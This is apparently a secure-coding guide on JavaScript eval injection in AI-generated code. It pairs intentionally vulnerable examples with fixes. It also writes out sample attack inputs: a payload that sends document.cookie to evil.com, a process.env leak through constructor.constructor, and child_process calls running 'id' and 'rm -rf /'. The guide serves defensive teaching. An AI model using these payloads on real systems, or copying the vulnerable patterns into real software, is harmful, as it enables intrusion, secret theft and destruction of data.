# Eval Injection — JavaScript

> **Severity:** Critical
> **CVSS:** 9.8 (Critical)
> **AI Generation Risk:** Very High — AI models overuse eval(), new Function(), and setTimeout with strings

---

## Vulnerability Explanation

JavaScript provides several ways to execute arbitrary code from strings. Each one represents a critical code injection vulnerability when user input is involved.

### The Dangerous APIs

| API | Executes | Risk Level | AI Usage Frequency |
|---|---|---|---|
| `eval()` | Any JavaScript | Critical | Very High |
| `new Function()` | Any JavaScript | Critical | High |
| `setTimeout(string)` | Any JavaScript | Critical | Medium |
| `setInterval(string)` | Any JavaScript | Critical | Low |
| `Function()` constructor | Any JavaScript | Critical | High |
| `script.src = dynamic` | External JS file | Critical | High |

### How Eval Injection Works

```javascript
// 🚫 VULNERABLE
const userInput = "1; fetch('https://evil.com/steal?cookie=' + document.cookie)";
const result = eval(userInput);  // 💥 Executes arbitrary code
```

Unlike Python's `eval()` which only handles expressions, JavaScript's `eval()` handles statements, declarations, and full programs.

---

## How AI / Vibe Coding Generates This

### 1. JSON Parsing with eval (Legacy Pattern)

```javascript
// 🚫 VULNERABLE — AI-generated JSON parser
function parseData(jsonString) {
  // AI learned eval-based JSON parsing from old tutorials
  return eval('(' + jsonString + ')');  // 💥 RCE
}
```

### 2. Dynamic Function Creation

```javascript
// 🚫 VULNERABLE — AI-generated dynamic filter
function createFilter(condition) {
  // AI creates a function from user-provided condition string
  return new Function('item', `return ${condition}`);  // 💥 Code injection
}

// Usage: items.filter(createFilter("item.price > 10"))
// Attacker: items.filter(createFilter("process.mainModule.require('child_process').execSync('id')"))
```

### 3. setTimeout/setInterval with String Arguments

```javascript
// 🚫 VULNERABLE — AI-generated delayed execution
function scheduleTask(taskCode) {
  // AI uses string-based setTimeout
  setTimeout(taskCode, 1000);  // 💥 If taskCode contains user input
}

// setTimeout evaluates the string as JavaScript!
// setTimeout("alert(1)", 1000) — executes alert after 1 second
```

### 4. Template Engine with eval

```javascript
// 🚫 VULNERABLE — AI-generated custom template engine
function renderTemplate(template, data) {
  // AI builds a mini template engine with eval
  const rendered = template.replace(/\{\{(.*?)\}\}/g, (_, expr) => {
    return eval(expr);  // 💥 Evaluates arbitrary code from template
  });
  return rendered;
}

// Template: "Hello {{ process.env.SECRET_KEY }}"
// Template: "Hello {{ __dirname }}"
// Template: "Hello {{ require('fs').readdirSync('/') }}"
```

### 5. Dynamic Property Access

```javascript
// 🚫 VULNERABLE — AI-generated dynamic getter
function getProperty(obj, propPath) {
  // AI uses eval for nested property access
  return eval(`obj.${propPath}`);  // 💥
}

// getProperty(user, "profile.name") — works as intended
// getProperty(user, "constructor.constructor('return process.env')()") — RCE
```

### 6. Code Sandboxes / Online Editors

```javascript
// 🚫 VULNERABLE — AI-generated code runner
function runUserCode(code) {
  // "Educational" code runner using eval
  try {
    eval(code);  // 💥 RCE in Node.js
  } catch (e) {
    console.error(e);
  }
}
```

---

## Vulnerable Code Example

### Express API with Dynamic Filter

```javascript
// 🚫 VULNERABLE — AI-generated Express endpoint
const express = require('express');
const app = express();

app.use(express.json());

// AI creates a "smart" API endpoint
app.post('/filter', (req, res) => {
  const { data, condition } = req.body;
  
  // Attacker sends: {"data": [1,2,3], "condition": "process.exit(1)"}
  try {
    const filterFn = new Function('item', `return ${condition}`);  // 💥
    const filtered = data.filter(filterFn);
    res.json({ result: filtered });
  } catch (e) {
    res.json({ error: e.message });
  }
});
```

### Node.js Module Loading via eval

```javascript
// 🚫 VULNERABLE — AI-generated plugin system
function loadPlugin(pluginCode) {
  // AI eval's plugin code for "flexibility"
  const module = { exports: {} };
  const wrapper = `
    (function(module, exports) {
      ${pluginCode}
    })(module, module.exports);
  `;
  eval(wrapper);  // 💥 Arbitrary code execution
  return module.exports;
}

// Attacker calls: loadPlugin("require('child_process').execSync('rm -rf /')")
```

---

## Secure Code Fix

### Fix 1: Replace eval with JSON.parse for JSON

```javascript
// 🚫 VULNERABLE
const data = eval('(' + jsonString + ')');

// ✅ SAFE
const data = JSON.parse(jsonString);  // ✅ Parses data only — no code execution
```

### Fix 2: Replace new Function() with Real Functions

```javascript
// 🚫 VULNERABLE
const filterFn = new Function('item', `return ${condition}`);

// ✅ SAFE — Use a predefined set of filter functions
const filters = {
  greaterThan: (item, val) => item > val,
  lessThan: (item, val) => item < val,
  equals: (item, val) => item === val,
  contains: (item, val) => item.includes(val),
};

// Map user-specified filter to safe function
function applyFilter(data, filterType, filterValue) {
  const filterFn = filters[filterType];
  if (!filterFn) throw new Error('Unknown filter');
  return data.filter(item => filterFn(item, filterValue));
}
```

### Fix 3: Replace setTimeout(string) with Function Reference

```javascript
// 🚫 VULNERABLE
setTimeout(userInput, 1000);

// ✅ SAFE — Pass a function reference, not a string
function handleTimeout() {
  // Controlled logic here
}
setTimeout(handleTimeout, 1000);

// Or for dynamic behavior, use an event system instead
```

### Fix 4: Use vm Module for Sandboxed Execution (Node.js)

```javascript
// ✅ SAFE — Node.js vm module with limited sandbox
const vm = require('vm');

function safeEval(code, context = {}) {
  // WARNING: vm is NOT a security sandbox — it can be escaped
  // Use vm2 or containerization for real isolation
  const sandbox = { ...context };
  vm.createContext(sandbox);
  
  try {
    return vm.runInContext(code, sandbox, {
      timeout: 1000,       // Prevent infinite loops
      displayErrors: false  // Don't leak internals
    });
  } catch (e) {
    return undefined;
  }
}
```

### Fix 5: Use a Proper Expression Parser

```javascript
// ✅ SAFE — Use a math expression parser for calculations
import { parse, evaluate } from 'mathjs';

function safeCalculate(expression) {
  // mathjs restricts to mathematical operations
  return evaluate(expression);  // ✅ No code execution
}
```

### Fix 6: Use Dynamic Property Access Without eval

```javascript
// 🚫 VULNERABLE
const value = eval(`obj.${propPath}`);

// ✅ SAFE
function getNestedValue(obj, path) {
  return path.split('.').reduce((current, key) => {
    return current ? current[key] : undefined;
  }, obj);
}
```

---

## Prevention Checklist

- [ ] NEVER use `eval()` — there is always a safer alternative
- [ ] NEVER use `new Function()` with user input
- [ ] NEVER use `setTimeout()` or `setInterval()` with string arguments (Node.js emits a warning)
- [ ] Use `JSON.parse()` instead of `eval()` for JSON parsing
- [ ] Use object lookups or Maps instead of dynamic code execution
- [ ] For template rendering, use a proper template engine (Handlebars, EJS, Pug)
- [ ] For mathematical expressions, use `mathjs` or a dedicated expression parser
- [ ] For Node.js sandboxed execution, use `vm2` (note: vm2 has known escapes — prefer containers)
- [ ] Set `NODE_OPTIONS=--disallow-code-generation-from-strings` in Node.js
- [ ] Use ESLint rule `no-eval` and `no-implied-eval` to catch these patterns

---

## Real-World CVEs

All of the following are real, NVD-verified JavaScript/Node.js code-execution CVEs in `vm2` — the exact sandbox library this page recommends treating with caution. They demonstrate why `vm`/`vm2` are not a security boundary: attacker-supplied code passed to the sandbox escapes to the host and runs arbitrary commands.

| CVE | Description | Impact |
|---|---|---|
| **CVE-2023-29017** | `vm2` <= 3.9.14 — host objects passed to `Error.prepareStackTrace` on unhandled async errors let sandboxed code reach the host | Sandbox escape → RCE (CVSS 9.8; fixed 3.9.15) |
| **CVE-2023-37466** | `vm2` <= 3.9.19 — Promise handler sanitization bypassed via the `@@species` accessor property | Sandbox escape → RCE (CVSS 10.0; fixed 3.10.0) |
| **CVE-2023-32314** | `vm2` <= 3.9.17 — unexpected creation of a host object via `Proxy` | Sandbox escape → RCE (CVSS 10.0; fixed 3.9.18) |
| **CVE-2022-36067** | `vm2` < 3.9.11 ("Sandbreak") — sandbox protections bypassed to run code on the host | Sandbox escape → RCE (CVSS 10.0; fixed 3.9.11) |

---

## Vibe Coding Red Flags

In AI-generated JavaScript, flag these immediately:

```javascript
eval(userInput)                   // 💥 Classic eval injection
eval('(' + userInput + ')')      // 💥 JSON parsing with eval
new Function(userInput)           // 💥 Function constructor
new Function('return ' + userInput)  // 💥 Dynamic function
setTimeout(userInput, ...)        // 💥 String-based timeout
setInterval(userInput, ...)       // 💥 String-based interval
Function(userInput)               // 💥 Short form of Function constructor
```

> **Golden Rule:** If AI-generated JavaScript contains `eval`, `new Function`, or string-based `setTimeout`, assume it's a code injection vulnerability. Replace with structured alternatives.
